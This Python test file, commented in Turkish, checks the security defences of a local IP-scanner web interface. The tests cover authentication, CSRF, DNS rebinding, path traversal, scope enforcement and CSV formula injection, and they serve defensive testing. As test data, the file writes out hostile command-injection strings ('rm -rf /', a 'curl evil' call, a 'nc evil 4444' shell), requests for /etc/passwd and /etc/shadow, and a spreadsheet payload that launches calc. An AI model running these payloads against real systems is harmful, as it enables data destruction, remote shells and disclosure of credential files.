"""Kara kutu guvenlik testleri.

Gercek bir web sunucusu ayaga kaldirilir ve saldirgan gibi davranan istekler
gonderilir. Her test, savunmalardan birinin calistigini dogrular:

  kimlik dogrulama · CSRF · DNS rebinding · dizin gezinme (path traversal)
  · girdi dogrulama · govde boyutu · kapsam zorlama · guvenlik basliklari
  · CSV formul enjeksiyonu · komut enjeksiyonu

Calistirma:  python3 -m unittest tests.test_security -v
"""

import http.client
import json
import socket
import tempfile
import threading
import unittest
from pathlib import Path

from ipscan import scope as scope_mod
from ipscan.report import to_csv
from ipscan.engine import Result
from ipscan.webapp import Handler, JobManager, Server


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class WebSecurityTests(unittest.TestCase):
    """Web arayuzunun saldiri yuzeyini sinar."""

    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        scope_path = Path(cls.tmp.name) / "scope.txt"
        scope_path.write_text("127.0.0.0/8\n", encoding="utf-8")

        cls.token = "T" * 43
        cls.port = free_port()
        cls.origin = f"127.0.0.1:{cls.port}"
        manager = JobManager(scope_mod.load_scope(str(scope_path), "auto"))
        allowed = {cls.origin, f"localhost:{cls.port}"}
        cls.server = Server(("127.0.0.1", cls.port), Handler, token=cls.token,
                            jobs=manager, allowed_hosts=allowed)
        cls.thread = threading.Thread(target=cls.server.serve_forever,
                                      kwargs={"poll_interval": 0.05}, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()
        cls.tmp.cleanup()

    # -- yardimci --------------------------------------------------------
    def request(self, method: str, path: str, *, headers=None, body=None,
                authed=True, host=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        hdrs = dict(headers or {})
        hdrs.setdefault("Host", host or self.origin)
        if authed:
            hdrs.setdefault("Cookie", f"ipscan_session={self.token}")
        try:
            conn.request(method, path, body=body, headers=hdrs)
            res = conn.getresponse()
            return res.status, res.read(), dict(res.getheaders())
        finally:
            conn.close()

    def scan_request(self, payload: dict, **kwargs):
        """Mesru arayuzun gonderdigi basliklarla /api/scan cagrisi."""
        headers = {"Content-Type": "application/json",
                   "X-Requested-With": "ipscan", **(kwargs.pop("headers", None) or {})}
        return self.request("POST", "/api/scan", body=json.dumps(payload),
                            headers=headers, **kwargs)

    # -- kimlik dogrulama ------------------------------------------------
    def test_index_requires_token(self):
        status, _, _ = self.request("GET", "/", authed=False)
        self.assertEqual(status, 401)

    def test_wrong_token_rejected(self):
        status, _, _ = self.request("GET", "/?t=" + "X" * 43, authed=False)
        self.assertEqual(status, 401)

    def test_token_grants_session_cookie(self):
        status, _, headers = self.request("GET", f"/?t={self.token}", authed=False)
        self.assertEqual(status, 200)
        cookie = headers.get("Set-Cookie", "")
        self.assertIn("HttpOnly", cookie)
        self.assertIn("SameSite=Strict", cookie)

    def test_api_requires_session(self):
        for path in ["/api/config", "/api/job?job=x", "/api/export?job=x",
                     "/api/stream?job=x"]:
            status, _, _ = self.request("GET", path, authed=False)
            self.assertEqual(status, 401, path)

    def test_truncated_token_rejected(self):
        status, _, _ = self.request(
            "GET", "/api/config", authed=False,
            headers={"Cookie": f"ipscan_session={self.token[:10]}"})
        self.assertEqual(status, 401)

    # -- DNS rebinding ---------------------------------------------------
    def test_foreign_host_header_rejected(self):
        for host in ["evil.example", "127.0.0.1.nip.io", "attacker:1234"]:
            status, _, _ = self.request("GET", "/api/config", host=host)
            self.assertEqual(status, 421, host)

    # -- CSRF ------------------------------------------------------------
    def test_cross_site_fetch_rejected(self):
        status, _, _ = self.request("GET", "/api/config",
                                    headers={"Sec-Fetch-Site": "cross-site"})
        self.assertEqual(status, 401)

    def test_foreign_origin_rejected(self):
        status, _, _ = self.scan_request(
            {"targets": "127.0.0.1", "ports": "80"},
            headers={"Origin": "http://evil.example"})
        self.assertEqual(status, 401)

    def test_post_without_custom_header_rejected(self):
        """Basit form POST'u (CSRF ile uretilebilen tek POST turu) reddedilir."""
        status, _, _ = self.request(
            "POST", "/api/scan", body='{"targets":"127.0.0.1","ports":"80"}',
            headers={"Content-Type": "application/x-www-form-urlencoded"})
        self.assertEqual(status, 403)

    # -- dizin gezinme ---------------------------------------------------
    def test_path_traversal_blocked(self):
        for path in ["/../ipscan/webapp.py", "/..%2f..%2fetc%2fpasswd",
                     "/static/../../etc/passwd", "/etc/passwd",
                     "/app.js/../../../../etc/shadow"]:
            status, body, _ = self.request("GET", path)
            self.assertIn(status, (400, 404), path)
            self.assertNotIn(b"root:", body)

    # -- girdi dogrulama -------------------------------------------------
    def test_command_injection_payloads_rejected(self):
        payloads = [
            "127.0.0.1; rm -rf /", "$(reboot)", "`id`", "127.0.0.1 && curl evil",
            "| nc evil 4444", "127.0.0.1\n/etc/passwd", "../../etc/passwd",
        ]
        for target in payloads:
            status, body, _ = self.scan_request({"targets": target, "ports": "80"})
            self.assertEqual(status, 400, target)
            self.assertIn("error", json.loads(body))

    def test_malformed_port_specs_rejected(self):
        for ports in ["0", "65536", "80;ls", "abc", "80-70000", ""]:
            status, _, _ = self.scan_request(
                {"targets": "127.0.0.1", "ports": ports})
            self.assertEqual(status, 400, ports)

    def test_hostname_requires_explicit_resolve(self):
        status, _, _ = self.scan_request(
            {"targets": "example.com", "ports": "80"})
        self.assertEqual(status, 400)

    def test_oversized_body_rejected(self):
        status, _, _ = self.scan_request(
            {"targets": "1.1.1.1 " * 60000, "ports": "80"})
        self.assertEqual(status, 413)

    def test_lying_content_length_rejected(self):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.request("POST", "/api/scan", body="{}", headers={
            "Host": self.origin, "Cookie": f"ipscan_session={self.token}",
            "X-Requested-With": "ipscan", "Content-Length": "999999999"})
        # Sunucu, gerçek gövdeyi okumaya kalkışmadan sınırı uygular.
        self.assertEqual(conn.getresponse().status, 413)
        conn.close()

    def test_non_object_json_rejected(self):
        status, _, _ = self.request("POST", "/api/scan", body='["a"]',
                                    headers={"Content-Type": "application/json",
                                             "X-Requested-With": "ipscan"})
        self.assertEqual(status, 400)

    def test_absurd_numeric_params_are_clamped(self):
        status, body, _ = self.scan_request({
            "targets": "127.0.0.1", "ports": "80",
            "timeout": 99999, "concurrency": 10 ** 9, "retries": 999})
        self.assertEqual(status, 200)
        opts = json.loads(body)["options"]
        self.assertLessEqual(opts["timeout"], 15)
        self.assertLessEqual(opts["retries"], 3)
        self.assertLessEqual(opts["concurrency"], 32768)

    # -- kapsam ----------------------------------------------------------
    def test_out_of_scope_target_refused(self):
        status, body, _ = self.scan_request({"targets": "8.8.8.8", "ports": "80"})
        self.assertEqual(status, 403)
        self.assertIn("Kapsam", json.loads(body)["error"])

    def test_in_scope_target_accepted(self):
        status, _, _ = self.scan_request({"targets": "127.0.0.1", "ports": "80"})
        self.assertEqual(status, 200)

    # -- diger -----------------------------------------------------------
    def test_security_headers_present(self):
        _, _, headers = self.request("GET", "/api/config")
        self.assertIn("default-src 'none'", headers["Content-Security-Policy"])
        self.assertNotIn("unsafe-inline", headers["Content-Security-Policy"])
        self.assertEqual(headers["X-Content-Type-Options"], "nosniff")
        self.assertEqual(headers["X-Frame-Options"], "DENY")
        self.assertEqual(headers["Referrer-Policy"], "no-referrer")

    def test_unknown_endpoints_404(self):
        for path in ["/api/admin", "/api/../api/config", "/wp-login.php"]:
            status, _, _ = self.request("GET", path)
            self.assertIn(status, (400, 404), path)

    def test_head_on_stream_not_allowed(self):
        """Sonsuz akisa HEAD atarak is parcacigi tuketilemez."""
        status, _, _ = self.request("HEAD", "/api/stream?job=x")
        self.assertEqual(status, 405)

    def test_unknown_job_id_is_404(self):
        status, _, _ = self.request("GET", "/api/export?job=" + "a" * 32)
        self.assertEqual(status, 404)

    def test_server_banner_hides_python_version(self):
        _, _, headers = self.request("GET", "/api/config")
        self.assertNotIn("Python", headers.get("Server", ""))


class OutputSafetyTests(unittest.TestCase):
    """Rapor ciktilarinin guvenligi."""

    def test_csv_formula_injection_neutralised(self):
        rows = [
            Result("10.0.0.1", 22, "open", 1.0,
                   banner="=cmd|'/c calc'!A1"),
            Result("10.0.0.2", 25, "open", 1.0, banner="+HYPERLINK(\"http://x\")"),
            Result("10.0.0.3", 80, "open", 1.0, banner="@SUM(1+1)"),
            Result("10.0.0.4", 81, "open", 1.0, banner="-2+3"),
        ]
        csv_text = to_csv(rows)
        for line in csv_text.splitlines()[1:]:
            cell = line.split(",")[-1]
            self.assertFalse(cell.startswith(("=", "+", "@", "-")), cell)

    def test_normal_banner_unchanged(self):
        csv_text = to_csv([Result("10.0.0.1", 22, "open", 1.0,
                                  banner="SSH-2.0-OpenSSH_9.6")])
        self.assertIn("SSH-2.0-OpenSSH_9.6", csv_text)

    def test_report_files_are_owner_only(self):
        import os
        import stat
        from ipscan.report import write_file
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "rapor.json")
            write_file(path, "{}")
            mode = stat.S_IMODE(os.stat(path).st_mode)
            self.assertEqual(mode, 0o600)


class ScopeBypassTests(unittest.TestCase):
    """Kapsam denetiminin atlatilamadigini dogrular."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        path = Path(self.tmp.name) / "scope.txt"
        path.write_text("192.168.1.0/24\n", encoding="utf-8")
        self.scope = scope_mod.load_scope(str(path), "auto")

    def tearDown(self):
        self.tmp.cleanup()

    def test_ipv4_mapped_ipv6_does_not_bypass(self):
        with self.assertRaises(scope_mod.ScopeError):
            scope_mod.enforce(self.scope, ["::ffff:8.8.8.8"])

    def test_one_bad_target_blocks_whole_scan(self):
        with self.assertRaises(scope_mod.ScopeError):
            scope_mod.enforce(self.scope, ["192.168.1.1"] * 50 + ["1.2.3.4"])

    def test_broadcast_and_network_addresses_still_checked(self):
        with self.assertRaises(scope_mod.ScopeError):
            scope_mod.enforce(self.scope, ["192.168.2.255"])


if __name__ == "__main__":
    unittest.main()
